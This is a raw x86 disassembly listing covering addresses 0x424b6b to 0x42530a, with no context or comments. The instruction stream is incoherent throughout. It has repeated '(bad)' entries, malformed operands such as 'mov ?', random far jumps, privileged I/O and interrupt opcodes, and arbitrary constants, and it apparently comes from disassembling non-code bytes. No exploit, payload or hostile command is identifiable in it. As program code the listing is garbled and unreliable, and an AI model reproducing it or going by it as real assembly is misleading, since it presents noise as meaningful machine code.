  424b6b:	xchg   DWORD PTR [esi-0x7ffa2ece],esp
  424b71:	pop    ss
  424b72:	add    BYTE PTR [eax],al
  424b74:	data16 jbe 0x424b32
  424b77:	outs   dx,DWORD PTR ds:[esi]
  424b78:	dec    ebx
  424b79:	enter  0xe0,0x0
  424b7d:	jns    0x424b84
  424b7f:	stos   DWORD PTR es:[edi],eax
  424b80:	hlt    
  424b81:	inc    eax
  424b82:	pop    ds
  424b83:	add    BYTE PTR [eax],al
  424b85:	lds    esp,FWORD PTR [esi+ecx*4+0x39]
  424b89:	xor    edi,DWORD PTR [ebx-0x5c]
  424b8c:	xchg   ecx,eax
  424b8d:	pop    eax
  424b8e:	iret   
  424b8f:	inc    eax
  424b90:	xlat   BYTE PTR ds:[ebx]
  424b91:	add    BYTE PTR [eax],al
  424b93:	(bad)  
  424b94:	ror    BYTE PTR [esp+ebp*2+0x52920000],1
  424b9b:	out    dx,eax
  424b9c:	xor    dh,bl
  424b9e:	shr    bh,cl
  424ba0:	dec    ecx
  424ba1:	bound  ebx,QWORD PTR ds:0x7584
  424ba7:	xor    ebx,ebp
  424ba9:	ins    BYTE PTR es:[edi],dx
  424baa:	jge    0x424bd4
  424bac:	jle    0x424c1f
  424bae:	jo     0x424b85
  424bb0:	inc    esi
  424bb1:	sub    al,0x1
  424bb3:	int    0x51
  424bb5:	inc    ebp
  424bb6:	adc    DWORD PTR [esi-0x54],esp
  424bb9:	and    DWORD PTR [esi],eax
  424bbb:	shr    BYTE PTR [esi-0x161a8db1],cl
  424bc1:	pop    eax
  424bc2:	jmp    0x424c38
  424bc4:	cmp    bh,dl
  424bc6:	adc    eax,edx
  424bc8:	lea    esi,[ebp+0xa80c73]
  424bce:	add    al,dh
  424bd0:	aad    0xe7
  424bd2:	and    bh,BYTE PTR [ebx]
  424bd4:	or     ebp,DWORD PTR [ebp+edx*8+0x9e0c]
  424bdb:	popa   
  424bdc:	adc    dh,BYTE PTR [ebx+eax*8]
  424bdf:	fsubr  st(1),st
  424be1:	pop    ss
  424be2:	dec    ebp
  424be3:	ins    BYTE PTR es:[edi],dx
  424be4:	js     0x424b70
  424be6:	pop    ds
  424be7:	mov    ds:0x3e64fd73,eax
  424bec:	mov    ebp,DWORD PTR [edi]
  424bee:	fs push ecx
  424bf0:	push   esp
  424bf1:	in     eax,dx
  424bf2:	push   0x69032ab0
  424bf7:	xor    al,0x0
  424bf9:	test   DWORD PTR [eax],0xfd98a900
  424bff:	dec    edi
  424c00:	ud1    edi,DWORD PTR [ebx+0xc]
  424c04:	mov    es,WORD PTR [eax]
  424c06:	add    BYTE PTR [edi-0x1659b1b5],ah
  424c0c:	inc    ebx
  424c0d:	xor    dh,BYTE PTR [edx-0x31596711]
  424c13:	pusha  
  424c14:	sub    esp,DWORD PTR [ebx-0x14]
  424c17:	jle    0x424bf6
  424c19:	mov    ebx,0x61c730ae
  424c1e:	sbb    ebp,eax
  424c20:	cmp    al,0x91
  424c22:	popf   
  424c23:	xor    BYTE PTR [bp+si],0x0
  424c27:	add    BYTE PTR [edx+0x65],ch
  424c2a:	xchg   DWORD PTR [eax+0x5c],ecx
  424c2d:	add    BYTE PTR [eax],al
  424c2f:	add    edx,DWORD PTR [esi+0x1f131734]
  424c35:	sbb    ch,BYTE PTR [eax+0x6e]
  424c38:	and    al,0x5c
  424c3a:	sbb    edx,ebp
  424c3c:	jg     0x424c92
  424c3e:	push   eax
  424c3f:	inc    esp
  424c40:	fiadd  WORD PTR [eax]
  424c42:	add    BYTE PTR [ebp-0x7c],bl
  424c45:	mov    eax,DWORD PTR [eax]
  424c47:	add    BYTE PTR [esi-0x7b07d129],ah
  424c4d:	push   ebp
  424c4e:	add    BYTE PTR [eax],al
  424c50:	push   eax
  424c51:	jp     0x424cb9
  424c53:	pop    eax
  424c54:	fwait
  424c55:	adc    eax,0x39ffcbaa
  424c5a:	mov    al,ds:0x7569586
  424c5f:	pusha  
  424c60:	sti    
  424c61:	dec    esp
  424c62:	add    eax,DWORD PTR [eax]
  424c64:	add    BYTE PTR [esi-0x56],bl
  424c67:	pop    ebp
  424c68:	or     bh,BYTE PTR [ebp-0x25]
  424c6b:	shl    BYTE PTR [esi-0x1d],1
  424c6e:	loop   0x424cda
  424c70:	mov    dl,0x96
  424c72:	pop    edi
  424c73:	jo     0x424c7e
  424c75:	ins    DWORD PTR es:[edi],dx
  424c76:	gs inc eax
  424c78:	loopne 0x424c7a
  424c7a:	add    BYTE PTR [edx],ch
  424c7c:	sbb    DWORD PTR [ecx],ecx
  424c7e:	add    al,0x10
  424c80:	add    BYTE PTR [eax],al
  424c82:	in     al,0xa2
  424c84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c85:	adc    eax,0x99b72769
  424c8a:	push   0x74e7bdf8
  424c8f:	call   0x11f7b06b
  424c94:	or     bh,BYTE PTR [esp+eiz*4]
  424c97:	xchg   ebx,eax
  424c98:	mov    esi,0xaf40
  424c9d:	js     0x424cb6
  424c9f:	mov    esi,0xafe6d23
  424ca4:	iret   
  424ca5:	cmp    DWORD PTR [ecx+0x67],0x2f0cd4
  424cac:	add    cl,ch
  424cae:	jle    0x424d1c
  424cb0:	push   esi
  424cb1:	push   esp
  424cb2:	mov    ebp,0x29a26a6d
  424cb7:	mov    ch,0xb6
  424cb9:	pusha  
  424cba:	pop    esp
  424cbb:	retf   
  424cbc:	jge    0x424d1a
  424cbe:	xchg   edx,eax
  424cbf:	addr16 push esp
  424cc1:	ror    DWORD PTR [ecx-0x4c424bbe],0xd5
  424cc8:	sub    dl,BYTE PTR [edx-0x35]
  424ccb:	mov    cl,bh
  424ccd:	add    BYTE PTR [eax],al
  424ccf:	iret   
  424cd0:	xchg   edx,eax
  424cd1:	inc    edx
  424cd2:	ins    BYTE PTR es:[edi],dx
  424cd3:	xchg   ecx,eax
  424cd4:	xchg   ch,bl
  424cd6:	fst    DWORD PTR [ebp-0x31822bad]
  424cdc:	jae    0x424cf3
  424cde:	xchg   edi,eax
  424cdf:	inc    esi
  424ce0:	aaa    
  424ce1:	pop    ebx
  424ce2:	rcl    dl,1
  424ce4:	bts    DWORD PTR [ebp+0x29],ecx
  424ce8:	mov    ecx,0xdd4c6dda
  424ced:	add    BYTE PTR [eax],al
  424cef:	mov    BYTE PTR [ecx-0x611b0000],ch
  424cf5:	pop    ds
  424cf6:	pop    esp
  424cf7:	xor    ebx,DWORD PTR [ebp+0x6e]
  424cfa:	es and edi,edx
  424cfd:	cmp    bh,al
  424cff:	lods   eax,DWORD PTR ds:[esi]
  424d00:	and    eax,0xda97cedf
  424d05:	sub    eax,0x56337baf
  424d0a:	in     al,0x9b
  424d0c:	fbstp  TBYTE PTR [ebp-0x17]
  424d0f:	inc    esp
  424d10:	sahf   
  424d11:	add    BYTE PTR [eax],al
  424d13:	hlt    
  424d14:	ins    DWORD PTR es:[edi],dx
  424d15:	dec    edi
  424d16:	jno    0x424d44
  424d18:	jle    0x424cf2
  424d1a:	xchg   esi,eax
  424d1b:	pop    edx
  424d1c:	loopne 0x424d53
  424d1e:	mov    ah,0xeb
  424d20:	movzx  esp,dx
  424d23:	test   al,0x73
  424d25:	aad    0x35
  424d27:	pop    esi
  424d28:	fwait
  424d29:	mov    ah,0x5a
  424d2b:	jbe    0x424d7d
  424d2d:	mov    bh,0xbd
  424d2f:	ret    0xb759
  424d32:	test   al,0xcb
  424d34:	adc    BYTE PTR [edi+0x0],0x0
  424d38:	add    edi,esp
  424d3a:	imul   ecx,DWORD PTR [eax-0x11],0x7e4d0000
  424d41:	sbb    BYTE PTR [esi+ebp*2-0x18],bl
  424d45:	push   ebx
  424d46:	call   0xc162:0xe68b91e3
  424d4d:	pop    ss
  424d4e:	mov    edx,0x8bc8d8
  424d53:	add    BYTE PTR [esi+esi*1],ch
  424d56:	test   al,0x2a
  424d58:	xchg   ebx,eax
  424d59:	rcr    bl,cl
  424d5b:	mov    ebx,0xef0470f4
  424d60:	add    BYTE PTR [eax],al
  424d62:	(bad)  
  424d63:	jne    0x424dad
  424d65:	jge    0x424d67
  424d67:	add    bh,al
  424d69:	xchg   BYTE PTR [eax],dl
  424d6b:	(bad)  
  424d6c:	xor    DWORD PTR [ebx+0x14],esp
  424d6f:	int3   
  424d70:	fadd   DWORD PTR [eax]
  424d72:	add    BYTE PTR [ecx],al
  424d74:	std    
  424d75:	imul   ebp,DWORD PTR [ebp-0x5b2ee6a8],0xc24c
  424d7f:	das    
  424d80:	scas   eax,DWORD PTR es:[edi]
  424d81:	xor    ebx,DWORD PTR [eax+0x7a]
  424d84:	inc    edx
  424d85:	cdq    
  424d86:	enter  0x9f,0x0
  424d8a:	cmp    dh,BYTE PTR [ebx+0x26]
  424d8d:	push   eax
  424d8e:	and    ch,cl
  424d90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d91:	leave  
  424d92:	int    0xf5
  424d94:	cmp    dl,dl
  424d96:	jg     0x424df9
  424d98:	imul   DWORD PTR [esi+0x7d3246ea]
  424d9e:	ds inc ecx
  424da0:	xchg   esp,eax
  424da1:	stos   DWORD PTR es:[edi],eax
  424da2:	ss jg  0x424e03
  424da5:	rol    bh,1
  424da7:	in     al,dx
  424da8:	test   DWORD PTR ds:0x41b3795d,0xb5088717
  424db2:	add    BYTE PTR [eax],al
  424db4:	hlt    
  424db5:	sbb    DWORD PTR [esi],ecx
  424db7:	jnp    0x424dc6
  424db9:	dec    eax
  424dba:	pop    ebx
  424dbb:	add    BYTE PTR [eax],al
  424dbd:	mov    ?,WORD PTR [eax]
  424dbf:	mov    eax,0xa2b21583
  424dc4:	mov    ?,WORD PTR [ebx-0x49f95b9d]
  424dca:	lea    eax,[ebx]
  424dcc:	nop
  424dcd:	push   esi
  424dce:	mov    BYTE PTR [eax+0x0],dh
  424dd1:	add    BYTE PTR [ebp+0x404c9382],dl
  424dd7:	add    BYTE PTR [eax],al
  424dd9:	and    BYTE PTR [esi-0x6f],bh
  424ddc:	xchg   ecx,eax
  424ddd:	mov    eax,ds:0x16bbfc8b
  424de2:	mov    BYTE PTR [edx-0x4d820000],bh
  424de8:	cmp    BYTE PTR [esi-0x4c0f2844],cl
  424dee:	adc    edi,DWORD PTR [edx]
  424df0:	adc    BYTE PTR [ebp+0x57],ch
  424df3:	xchg   DWORD PTR [esi],eax
  424df5:	in     eax,dx
  424df6:	sub    ecx,DWORD PTR [ebx-0x33]
  424df9:	loopne 0x424e5d
  424dfb:	pop    esi
  424dfc:	pop    esi
  424dfd:	or     BYTE PTR [ebx+0x0],cl
  424e00:	add    bl,cl
  424e02:	or     ch,bl
  424e04:	sbb    ah,cl
  424e06:	xor    eax,0xfbc40000
  424e0b:	add    BYTE PTR [eax],al
  424e0d:	adc    al,0x79
  424e0f:	push   ebp
  424e10:	xchg   esi,eax
  424e11:	mov    ecx,0xa8d0718f
  424e16:	popa   
  424e17:	xlat   BYTE PTR ds:[ebx]
  424e18:	mov    ds:0xb3307a3f,al
  424e1d:	adc    eax,eax
  424e1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424e20:	add    BYTE PTR [eax],al
  424e22:	icebp  
  424e23:	repz ret 
  424e25:	div    DWORD PTR ds:0xfda73f16
  424e2b:	aaa    
  424e2c:	pop    edx
  424e2d:	pop    ss
  424e2e:	enter  0xa5,0x0
  424e32:	jo     0x424e38
  424e34:	cmp    eax,DWORD PTR [eax]
  424e36:	add    BYTE PTR [esi],dh
  424e38:	mov    ds:0xbdf06417,eax
  424e3d:	(bad)  
  424e3e:	test   BYTE PTR [edi+0x0],al
  424e41:	add    BYTE PTR [ebx+0x5c],dh
  424e44:	xchg   edx,eax
  424e45:	dec    esp
  424e46:	sbb    BYTE PTR [eax],al
  424e48:	add    BYTE PTR [eax-0x113dd28c],dl
  424e4e:	and    edx,DWORD PTR [edx-0x14bf9df9]
  424e54:	add    BYTE PTR [eax],al
  424e56:	sbb    eax,0x826857f2
  424e5b:	addr16 int3 
  424e5d:	xchg   DWORD PTR [eax],eax
  424e5f:	add    BYTE PTR ds:0x4bb5b42c,ch
  424e65:	arpl   WORD PTR [esi+0x6a],ax
  424e68:	add    esp,edx
  424e6a:	outs   dx,DWORD PTR ds:[esi]
  424e6b:	stc    
  424e6c:	jne    0x424e2a
  424e6e:	pop    ds
  424e6f:	mov    edi,0x1645b85f
  424e74:	aas    
  424e75:	xchg   ebp,eax
  424e76:	das    
  424e77:	test   eax,0x388bc1ef
  424e7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424e7d:	xchg   edx,eax
  424e7e:	mov    edi,0x488bb2ea
  424e83:	jmp    0x0:0xa9800000
  424e8a:	or     dh,BYTE PTR [ebx+0x28be9c52]
  424e90:	mov    ebx,0xa8dff6df
  424e95:	out    0xa0,al
  424e97:	push   ds
  424e98:	add    dl,0x0
  424e9b:	add    BYTE PTR [ecx+0x2dec0fe6],dh
  424ea1:	ds dec ebx
  424ea3:	pop    ds
  424ea4:	daa    
  424ea5:	inc    eax
  424ea6:	jle    0x424ea8
  424ea8:	add    BYTE PTR [eax-0x7c],dh
  424eab:	xor    DWORD PTR [eax],eax
  424ead:	add    BYTE PTR [ecx-0x5c],bh
  424eb0:	push   ds
  424eb1:	mov    ch,0x2a
  424eb3:	sbb    DWORD PTR [edx+esi*2+0x6d564771],esi
  424eba:	pusha  
  424ebb:	daa    
  424ebc:	pop    ss
  424ebd:	lea    ecx,[edi]
  424ebf:	icebp  
  424ec0:	(bad)  
  424ec1:	mov    esi,0x6043a2a1
  424ec6:	mov    edi,0x9188f6a7
  424ecb:	add    BYTE PTR [eax],al
  424ecd:	in     al,0x1a
  424ecf:	int3   
  424ed0:	into   
  424ed1:	add    BYTE PTR [eax],al
  424ed3:	les    esi,FWORD PTR [ebp+0x66110000]
  424ed9:	xchg   di,ax
  424edb:	in     al,dx
  424edc:	xor    eax,0x83fa7f8a
  424ee1:	mov    ebp,0x6b8c41
  424ee6:	add    dh,bh
  424ee8:	sar    DWORD PTR [ebx],1
  424eea:	mov    ebp,0x9504
  424eef:	fisubr DWORD PTR [edx+0x24]
  424ef2:	sbb    dh,ch
  424ef4:	fbstp  TBYTE PTR ds:0x9eee1197
  424efa:	test   al,0x8b
  424efc:	test   esp,ebx
  424efe:	ss add eax,0x2f460972
  424f04:	dec    edi
  424f05:	xchg   ebp,eax
  424f06:	and    ch,BYTE PTR [eax]
  424f08:	enter  0xcd,0x0
  424f0c:	mov    ecx,0xeb51d819
  424f11:	jp     0x424f25
  424f13:	adc    al,0x6b
  424f15:	inc    edx
  424f16:	inc    ebx
  424f17:	pop    esp
  424f18:	test   eax,0x6731074f
  424f1d:	lds    edi,FWORD PTR [esi-0x1b736c9]
  424f23:	add    BYTE PTR [eax],al
  424f25:	sub    BYTE PTR [edx+0x2680000],0x1e
  424f2c:	xor    DWORD PTR [ebx-0x73],ecx
  424f2f:	push   esp
  424f30:	sub    BYTE PTR [edi-0x1],ch
  424f33:	fisubr DWORD PTR [ebx+0x3300e9ef]
  424f39:	add    BYTE PTR [eax],al
  424f3b:	or     dl,dh
  424f3d:	add    BYTE PTR [eax],al
  424f3f:	and    DWORD PTR [edi],ecx
  424f41:	in     eax,0x88
  424f43:	scas   eax,DWORD PTR es:[edi]
  424f44:	add    BYTE PTR [eax],al
  424f46:	push   esi
  424f47:	psubw  mm5,mm5
  424f4a:	jl     0x424f90
  424f4c:	mov    ebp,0xc9c20000
  424f51:	es or  eax,0x2a6272c6
  424f57:	scas   eax,DWORD PTR es:[edi]
  424f58:	je     0x424ef4
  424f5a:	call   0x8324ed21
  424f5f:	inc    eax
  424f60:	adc    BYTE PTR [eax],al
  424f62:	add    BYTE PTR [ebp-0x56eeeed1],dl
  424f68:	and    edx,DWORD PTR [edx+0x5d]
  424f6b:	or     ebx,DWORD PTR [edi+0x34]
  424f6e:	sub    edi,0x4d1bd94d
  424f74:	mov    dh,BYTE PTR [edi-0x847e3f]
  424f7a:	or     BYTE PTR [ebx+0x2abc0000],al
  424f80:	push   edi
  424f81:	fucomip st,st(1)
  424f83:	sub    eax,DWORD PTR [edx]
  424f85:	push   edx
  424f86:	mov    esp,0x7a96b533
  424f8b:	ins    BYTE PTR es:[edi],dx
  424f8c:	and    ch,0x36
  424f8f:	cdq    
  424f90:	adc    eax,edi
  424f92:	pop    esi
  424f93:	retf   
  424f94:	add    DWORD PTR [edi+0x79338573],0xffffffe8
  424f9b:	xor    al,BYTE PTR [edx]
  424f9d:	pop    DWORD PTR [edx+0x21e38f6d]
  424fa3:	cmp    dl,BYTE PTR [esi]
  424fa5:	ja     0x424fea
  424fa7:	xchg   DWORD PTR [edi-0x32],esp
  424faa:	stos   DWORD PTR es:[edi],eax
  424fab:	outs   dx,BYTE PTR ds:[esi]
  424fac:	adc    ecx,DWORD PTR [ecx-0x9f9c3f1]
  424fb2:	xor    bl,BYTE PTR [ecx]
  424fb4:	(bad)  
  424fb5:	test   eax,0xbf7c31fd
  424fba:	jo     0x424fba
  424fbc:	pop    ebx
  424fbd:	(bad)  
  424fbe:	jae    0x424fb5
  424fc0:	scas   eax,DWORD PTR es:[edi]
  424fc1:	std    
  424fc2:	pop    es
  424fc3:	jge    0x425007
  424fc5:	fs inc ebp
  424fc7:	mov    BYTE PTR ds:[ebx],dh
  424fca:	add    BYTE PTR [eax],al
  424fcc:	sub    eax,0x7971b62c
  424fd1:	repnz icebp 
  424fd3:	pop    ebx
  424fd4:	rol    ecx,0x2d
  424fd7:	leave  
  424fd8:	adc    bl,BYTE PTR [eax-0x2a]
  424fdb:	inc    edx
  424fdc:	or     DWORD PTR [edx],0xfd4f0e36
  424fe2:	arpl   di,dx
  424fe4:	or     esp,edx
  424fe6:	out    dx,eax
  424fe7:	pop    es
  424fe8:	adc    DWORD PTR [edi-0x6d],edi
  424feb:	mov    WORD PTR [eax+0x0],gs
  424fee:	add    BYTE PTR [eax+0x74735fc1],ch
  424ff4:	ins    DWORD PTR es:[edi],dx
  424ff5:	xchg   ecx,eax
  424ff6:	leave  
  424ff7:	pop    eax
  424ff8:	or     BYTE PTR [ecx-0x65e50000],ah
  424ffe:	push   eax
  424fff:	and    eax,0xf5a12d41
  425004:	mov    ecx,0x62ea664a
  425009:	inc    ebx
  42500a:	mov    bh,0xb7
  42500c:	shl    BYTE PTR [esi-0x7910000],0x61
  425013:	loopne 0x424fc4
  425015:	add    al,BYTE PTR [esi+edx*8]
  425018:	add    BYTE PTR [eax],al
  42501a:	mov    dh,0x32
  42501c:	xor    BYTE PTR [edx+0x20],cl
  42501f:	leave  
  425020:	loop   0x424fb7
  425022:	xchg   ebp,eax
  425023:	retf   
  425024:	inc    esp
  425025:	in     eax,0x0
  425027:	add    BYTE PTR [ecx+0x44],al
  42502a:	sbb    BYTE PTR [eax],al
  42502c:	add    BYTE PTR [eax+ecx*2],ah
  42502f:	mov    DWORD PTR [eax],0xa1b33500
  425035:	js     0x425050
  425037:	jmp    0x424fe2
  425039:	div    DWORD PTR [edi+eax*2-0xd]
  42503d:	hlt    
  42503e:	int    0xce
  425040:	test   eax,0x7da80e2e
  425045:	push   ds
  425046:	jge    0x425052
  425048:	fsubrp st(4),st
  42504a:	inc    edx
  42504b:	xlat   BYTE PTR ds:[ebx]
  42504c:	sar    DWORD PTR [ecx],0x57
  42504f:	mov    cl,0x5d
  425051:	sub    ebp,esp
  425053:	xchg   ecx,eax
  425054:	pop    edx
  425055:	fcmove st,st(4)
  425057:	int    0x0
  425059:	add    bh,ch
  42505b:	retf   
  42505c:	or     BYTE PTR [esi],0x11
  42505f:	mov    ch,0x23
  425061:	adc    esp,DWORD PTR [ebx*1-0x5ffbfcf7]
  425068:	add    BYTE PTR [eax],al
  42506a:	hlt    
  42506b:	stos   DWORD PTR es:[edi],eax
  42506c:	mov    esi,0x255f2111
  425071:	sub    al,0x33
  425073:	frstor [esi+0x37669498]
  425079:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42507a:	imul   esi,edx
  42507d:	or     ebp,DWORD PTR [esp+edi*2]
  425080:	adc    BYTE PTR [ecx+0x4cdc0000],0x5d
  425087:	add    BYTE PTR [eax],al
  425089:	fist   DWORD PTR [ebx+0xe]
  42508c:	mov    eax,ds:0xd914d38a
  425091:	call   0x739c:0x676b0be8
  425098:	dec    eax
  425099:	test   BYTE PTR [eax],al
  42509b:	add    BYTE PTR ds:0x2d08e3,ah
  4250a1:	add    BYTE PTR [ecx+eiz*2+0x2323f24e],dh
  4250a8:	cmp    esi,DWORD PTR [eax*8+0x7dcccb]
  4250af:	add    dl,dl
  4250b1:	cwde   
  4250b2:	add    eax,0xb7bc9c77
  4250b7:	fs jp  0x425052
  4250ba:	add    ah,BYTE PTR [esi]
  4250bc:	dec    eax
  4250bd:	push   ds
  4250be:	add    BYTE PTR [eax],al
  4250c0:	mov    edi,DWORD PTR [edi+0x785d1a06]
  4250c6:	sbb    ch,bl
  4250c8:	mov    dh,0xd3
  4250ca:	je     0x425126
  4250cc:	inc    ecx
  4250cd:	pop    edi
  4250ce:	pop    eax
  4250cf:	test   eax,0x9d4a6fa5
  4250d4:	xor    ecx,ebp
  4250d6:	dec    esi
  4250d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4250d8:	aam    0x13
  4250da:	jmp    0xe5aa:0xfc9153e2
  4250e1:	xchg   esi,eax
  4250e2:	xchg   ecx,eax
  4250e3:	ret    
  4250e4:	jecxz  0x4250f1
  4250e6:	and    ah,dl
  4250e8:	icebp  
  4250e9:	push   cs
  4250ea:	out    0x94,al
  4250ec:	mov    edi,ebp
  4250ee:	cmc    
  4250ef:	imul   ebp,DWORD PTR [esi],0x2b48
  4250f5:	push   esp
  4250f6:	sbb    BYTE PTR [ecx+0x41],al
  4250f9:	cs nop
  4250fb:	or     eax,0x7ea195eb
  425100:	mov    dl,0x79
  425102:	rcr    DWORD PTR [eax-0x7c],0x8d
  425106:	add    BYTE PTR [eax],al
  425108:	xchg   ebp,eax
  425109:	mov    ecx,0x4e48bd
  42510e:	add    BYTE PTR [ebp-0x79],dh
  425111:	jle    0x42510e
  425113:	arpl   WORD PTR [ebp+0x2e],sp
  425116:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425117:	es stos BYTE PTR es:[edi],al
  425119:	push   ecx
  42511a:	push   ebp
  42511b:	mov    dl,bh
  42511d:	pop    esi
  42511e:	jne    0x425106
  425120:	stos   BYTE PTR es:[edi],al
  425121:	clc    
  425122:	pop    DWORD PTR [ecx]
  425124:	xor    al,0x20
  425126:	cmp    eax,0xb262c393
  42512b:	adc    dh,BYTE PTR [ecx]
  42512d:	xchg   ebp,eax
  42512e:	mov    ss,WORD PTR [edi-0xd]
  425131:	mov    esi,0x80badc0e
  425136:	nop
  425137:	add    BYTE PTR [eax],al
  425139:	xor    DWORD PTR [edi+0x7e],0x25
  42513d:	pop    es
  42513e:	add    DWORD PTR [edx+eax*4],0xbfb90000
  425145:	shl    BYTE PTR [edx-0x1b310000],0xac
  42514c:	aad    0xdb
  42514e:	das    
  42514f:	mov    eax,0x22b15be6
  425154:	cmc    
  425155:	xchg   bl,ah
  425157:	in     eax,dx
  425158:	test   BYTE PTR [ebx+0x0],ah
  42515b:	add    BYTE PTR [ecx],dh
  42515d:	pop    ss
  42515e:	sahf   
  42515f:	not    DWORD PTR ds:0x12b876dd
  425165:	add    eax,0x32c8f550
  42516a:	add    BYTE PTR [eax],al
  42516c:	rcr    edx,0xb6
  42516f:	cwde   
  425170:	(bad)  
  425171:	fcom   QWORD PTR [eax-0x5a]
  425174:	(bad)  
  425175:	in     al,dx
  425176:	stos   DWORD PTR es:[edi],eax
  425177:	cmp    ecx,ebx
  425179:	xor    bl,BYTE PTR [ecx-0x21ada7f3]
  42517f:	cld    
  425180:	push   edi
  425181:	mov    esp,0xd715d361
  425186:	mov    al,0x40
  425188:	in     al,0x0
  42518a:	add    BYTE PTR [ebp+0x50],al
  42518d:	pop    eax
  42518e:	mov    dl,0x6d
  425190:	pop    ebx
  425191:	ins    DWORD PTR es:[edi],dx
  425192:	sbb    edx,DWORD PTR [ebx+0x62]
  425195:	scas   al,BYTE PTR es:[edi]
  425196:	jae    0x425210
  425198:	daa    
  425199:	sbb    al,0x27
  42519b:	out    0x60,eax
  42519d:	jae    0x4251fb
  42519f:	dec    esp
  4251a0:	out    dx,al
  4251a1:	add    BYTE PTR [eax],al
  4251a3:	(bad)  
  4251a4:	leave  
  4251a5:	jb     0x42512c
  4251a7:	cmp    ecx,DWORD PTR [esi]
  4251a9:	sbb    eax,0xadbad870
  4251ae:	mov    esp,0x32d83fb3
  4251b3:	repnz or al,0x35
  4251b6:	add    BYTE PTR [eax],al
  4251b8:	or     eax,0x3a46cf4b
  4251bd:	fmul   DWORD PTR ds:0x25b92181
  4251c3:	jle    0x425244
  4251c5:	pop    ebp
  4251c6:	jb     0x425229
  4251c8:	into   
  4251c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4251ca:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4251cc:	and    DWORD PTR [ebp-0x22848d9e],eax
  4251d2:	cdq    
  4251d3:	inc    ebx
  4251d4:	pop    ds
  4251d5:	mov    cl,BYTE PTR es:0xfa6cf2bd
  4251dc:	push   es
  4251dd:	mov    esi,DWORD PTR [edx]
  4251df:	mov    esp,0x67b035
  4251e4:	fiadd  DWORD PTR [eax]
  4251e6:	add    BYTE PTR [ebx],ah
  4251e8:	into   
  4251e9:	inc    ecx
  4251ea:	loop   0x425248
  4251ec:	push   0x53149014
  4251f1:	in     eax,0x15
  4251f3:	mov    esp,0x17c6b606
  4251f8:	adc    DWORD PTR [ebx-0x1d],esi
  4251fb:	repz sbb eax,0x668e975a
  425201:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425202:	xor    al,0xf
  425204:	cmp    dh,BYTE PTR [edx-0x4]
  425207:	xor    edi,ecx
  425209:	inc    esi
  42520a:	sti    
  42520b:	fcomp  QWORD PTR fs:0xacd6f9b5
  425212:	call   0x5979:0x225da69b
  425219:	mov    bh,0x27
  42521b:	test   eax,0xad71e37f
  425220:	fs ja  0x425261
  425223:	push   ebx
  425224:	mov    gs,WORD PTR [esi+edx*8]
  425227:	pop    esp
  425228:	(bad)  
  425229:	push   esi
  42522a:	shl    BYTE PTR ds:0xecc5d236,1
  425230:	js     0x4251b4
  425232:	adc    ebx,edx
  425234:	out    dx,eax
  425235:	inc    esp
  425236:	xchg   ecx,eax
  425237:	add    BYTE PTR [eax],al
  425239:	ds retf 0x3fe3
  42523d:	into   
  42523e:	or     al,0x93
  425240:	add    BYTE PTR [eax],al
  425242:	inc    eax
  425243:	ret    0x0
  425246:	popa   
  425247:	rcl    BYTE PTR [ecx+0x0],0x0
  42524b:	in     eax,dx
  42524c:	mov    ebx,0xd238b5ea
  425251:	js     0x425219
  425253:	sub    esi,DWORD PTR [edx-0x7f2d25be]
  425259:	inc    eax
  42525a:	add    BYTE PTR [eax],al
  42525c:	adc    BYTE PTR [edi],dl
  42525e:	xor    BYTE PTR [eax-0x288071a3],dh
  425264:	cmp    esi,ecx
  425266:	dec    DWORD PTR [esi+0x7]
  425269:	clc    
  42526a:	cdq    
  42526b:	sub    eax,0xad69459
  425270:	ret    0x42c
  425273:	xchg   DWORD PTR [eax],eax
  425275:	add    BYTE PTR [ebx-0x7a2ccb41],ah
  42527b:	mov    dl,0x30
  42527d:	xchg   edi,eax
  42527e:	fist   DWORD PTR [edx+0x2c]
  425281:	jb     0x42526d
  425283:	scas   eax,DWORD PTR es:[edi]
  425284:	jmp    0xbfe3:0x6198649b
  42528b:	jl     0x425273
  42528d:	iret   
  42528e:	cdq    
  42528f:	stc    
  425290:	inc    cl
  425292:	fcmovnbe st,st(5)
  425294:	stos   DWORD PTR es:[edi],eax
  425295:	out    0xc5,al
  425297:	cmp    al,0xe7
  425299:	ins    DWORD PTR es:[edi],dx
  42529a:	adc    edx,DWORD PTR [ebx]
  42529c:	jne    0x4252ab
  42529e:	push   eax
  42529f:	fmul   DWORD PTR [esi-0x5]
  4252a2:	outs   dx,BYTE PTR ds:[esi]
  4252a3:	in     al,dx
  4252a4:	inc    ebx
  4252a5:	sbb    dl,bh
  4252a7:	jb     0x425281
  4252a9:	(bad)  
  4252aa:	mov    edx,0x5fd22972
  4252af:	jb     0x425246
  4252b1:	and    edi,DWORD PTR [edi+0x398021]
  4252b7:	add    al,ch
  4252b9:	jmp    0x425316
  4252bb:	cmp    BYTE PTR [ebx],cl
  4252bd:	addr16 ds jnp 0x425309
  4252c1:	sub    al,0x0
  4252c3:	add    BYTE PTR [esi-0x6a],bl
  4252c6:	push   0x6
  4252c8:	jae    0x4252d9
  4252ca:	xor    ch,BYTE PTR [eax+edi*2+0x33f787b2]
  4252d1:	adc    cl,cl
  4252d3:	mov    edi,edx
  4252d5:	inc    esp
  4252d6:	in     eax,0x0
  4252d8:	add    BYTE PTR [ecx-0x7c],ch
  4252db:	push   ss
  4252dc:	add    BYTE PTR [eax],al
  4252de:	add    eax,0x307197dd
  4252e3:	lock nop
  4252e5:	fs mov esp,0x33f541
  4252eb:	out    0x0,eax
  4252ed:	add    al,cl
  4252ef:	in     eax,dx
  4252f0:	add    BYTE PTR [eax],al
  4252f2:	push   esi
  4252f3:	jge    0x425374
  4252f5:	stos   DWORD PTR es:[edi],eax
  4252f6:	mov    eax,0xbe0c4bc2
  4252fb:	add    BYTE PTR [eax],al
  4252fd:	add    esi,0xffffffee
  425300:	push   es
  425301:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425302:	les    ebx,FWORD PTR [ebp+0x3dde0000]
  425308:	dec    ecx
  425309:	dec    esp
  42530a:	popa   
